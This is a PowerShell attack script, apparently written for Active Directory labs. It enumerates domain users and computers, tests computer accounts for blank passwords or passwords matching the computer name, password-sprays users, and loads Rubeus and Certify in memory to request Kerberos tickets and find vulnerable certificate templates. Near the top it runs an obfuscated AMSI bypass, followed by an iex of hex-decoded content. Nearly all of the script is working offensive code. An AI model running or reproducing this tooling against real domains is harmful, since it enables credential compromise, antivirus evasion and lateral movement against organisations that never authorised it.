<#
.SYNOPSIS
  Checking for users and computers with blank passwords or pre-created computer-accounts. Will also password-spray users if using parameter -SprayPass

  .DESCRIPTION
The perils of the Pre-Windows 2000 compatible access group in a Windows Domain.
On Windows 2000 and probably 2003/2008 too, that group contained groups: Anonymous/Everyone/Authenticated Users
Even if you have upgraded your Domain Controllers to Windows 2022, that group is kept unchanged.

That means a anonymous user can query domain information, like userinfo, group membership, trusts, etc.
Even newly installed domains running Windows 2022, will still have Authenticated users as members in that group.

So if you have user credentials, you can still query all that information.

Prenum.ps1 is a script exploiting this, by requesting information that might be useful for an attacker.
It can search for computer account with password the same as computername or no password at all. 

This could be the situation if computer-accounts are pre-created with the box Assign this computer account as a pre-Windows 2000 computer
are ticked, or computer-accounts are created with other tools.

.PARAMETER DC
  Domain Controller

.PARAMETER Domain
 FQDN Domain name

.PARAMETER Users [Switch]
  Test user-accounts

.PARAMETER Computers [Switch]
  Test computer-accounts 

.PARAMETER Spraypass
  Password for Passwordspraying. (Needs -Users switch)

.PARAMETER TestCA [Switch]
  Test CA for vulnerable certificate templates

.PARAMETER Certify
  Run Certify command

.PARAMETER Rubeus
  Run Rubeus command

.PARAMETER Ldap
  Run LDAP Search

.EXAMPLE

Enumerate users, computers and passwordspraying

   .\Prenum.ps1' -DC menhit -Domain windcorp.htb -Users -Computers -Spraypass 'WelcomeToWindcorp#2023'

   Output:
    Testing Computers
    Pwned computer: WS-BERBAN$ using password: ws-berbans
    Pwned computer: WS-SIRAP$ using password: ws-sirap

    Testing users
    Pwned user: Jeremy.Siko using password: WelcomeToWindcorp#2023
    Pwned user: John Doe no password

Running Rubeus

  .\Prenum.ps1 -DC menhit -Domain windcorp.htb -Rubeus "triage"

  Output:

Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x6cf06

 ----------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                  | Service                               | EndTime             |
 ----------------------------------------------------------------------------------------------------- 
 | 0x6cf06 | ws-berban$ @ WINDCORP.HTB | krbtgt/windcorp.htb                   | 12.05.2023 00:49:18 |
 | 0x6cf06 | ws-berban$ @ WINDCORP.HTB | ldap/Menhit.windcorp.htb              | 12.05.2023 00:49:18 |
 | 0x6cf06 | ws-berban$ @ WINDCORP.HTB | ldap/Menhit.windcorp.htb/windcorp.htb | 12.05.2023 00:49:18 |
 ----------------------------------------------------------------------------------------------------- 
.NOTES  
    File Name  : prenum.ps1  
    Author     : Andreas Finstad (4ndr34z)  
  
#>

[CmdletBinding(DefaultParametersetName='None')]
param(
  [Parameter(ParameterSetName='ldap',Mandatory=$true)]
  [string]$DC,
  [Parameter(ParameterSetName='ldap',Mandatory=$true)]
  [string]$Domain,
  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
  [string]$Spraypass,
  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
  [switch]$Users,
  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
  [switch]$Computers,
  [Parameter(Mandatory=$false)]
  [switch]$TestCA,
  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
  [string]$Rubeus,
  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
  [switch]$Asktgt,
  [Parameter(Mandatory=$false)]
  [string]$Certify,
  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
  [string]$Ldap
)


((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*s'}).GetFields(2*20)|?{$_-clike'*d'}).SetValue($null,$true))
$bp = ""
$bp = $bp -split '(..)' -ne '' |ForEach-Object {[char][byte]"0x$_"}
iex ($bp = $bp -join '')

$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [adsi]"LDAP://$DC.$Domain"
Function Test-ADAuthentication {
    param(
        $username,
        $password)
    
    (New-Object DirectoryServices.DirectoryEntry "",$Domain\$username,$password).psbase.name -ne $null
}

Function Load-Rubeus (){
  Param(
  [Parameter(Position = 0)]
  [String[]]
  $Command
)
  $params = $Command.split(' ')
  $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(""))
  $RubeusAssembly.EntryPoint.Invoke(0,@(,[String[]]@($params)));
}

Function Load-Certify (){
  Param(
    [Parameter(Position = 0)]
    [String[]]
    $Command
  )
  $params = $Command.split(' ')
  $CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(""))
  $CertifyAssembly.EntryPoint.Invoke(0,@(,[String[]]@($params)));
}

Function Test-Computers {
    write-host
    write-host Testing Computers  -ForegroundColor Yellow
    $searcher.Filter = '(&(objectClass=computer)(samaccountname=*))'
    $results = $searcher.FindAll()

    $computers = @()
    foreach ($result in $results) {
        $computers += $result.Properties['samaccountname']
    }

    $computers | foreach-object -Process {
        
    $valid = Test-ADAuthentication -username $_ -password $_.Replace("`$","").ToLower()
    $pass = $_.Replace("`$","").ToLower()

      if ($valid) {
        if ($Asktgt) {
          Load-Rubeus -command "asktgt /user:$_ /password:$pass /outfile:$_.kirbi /nowrap"
        }
        
        write-host Pwned computer: $_ using password: $_.Replace("`$","").ToLower() -ForegroundColor Cyan
      } else {
          $valid = Test-ADAuthentication -username $_ -password ""
            if ($valid) {
              write-host Pwned computer $_ no password -ForegroundColor Cyan
            }
          }

    } 
}


Function Test-Users {
    $searcher.Filter = '(&(objectClass=user)(samaccountname=*))'
    $results = $searcher.FindAll()

    $users = @()
    foreach ($result in $results) {
        $users += $result.Properties['samaccountname']

    }

    write-host
    write-host Testing users -ForegroundColor Yellow
    $users | foreach-object -Process {
   
    $valid = Test-ADAuthentication -username $_ -password ""

      if ($valid) {
        write-host Pwned user: $_ no password -ForegroundColor Cyan
      } 

        if ($Spraypass) {
          
          $valid = Test-ADAuthentication -username $_ -password $Spraypass
          
          if ($valid) {
            write-host Pwned user: $_ using password: $Spraypass -ForegroundColor Cyan
              if ($Asktgt) {
                Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /outfile:$_.kirbi /nowrap"
              }
            
          } 

        } 
      } 
}

Function Ldap-Search ($filter){
  $searcher.Filter = '$filter'
  $results = $searcher.FindAll()

}

if ($Ldap) {
  Ldap-Search $Ldap
}


  if ($Computers) {
    Test-Computers
  }

  if ($Users) {
    Test-Users
  }
  
  if ($TestCA) {
    Load-Certify -command "find /vulnerable /outfile:vulntemplates.txt"
    Get-Content vulntemplates.txt
    write-host "Saved in file: vulntemplates.txt"
  }
 
  if ($Certify) {
    Load-Certify -command $Certify
  }

  if ($Rubeus) {
    Load-Rubeus -command $Rubeus
  }

  
 

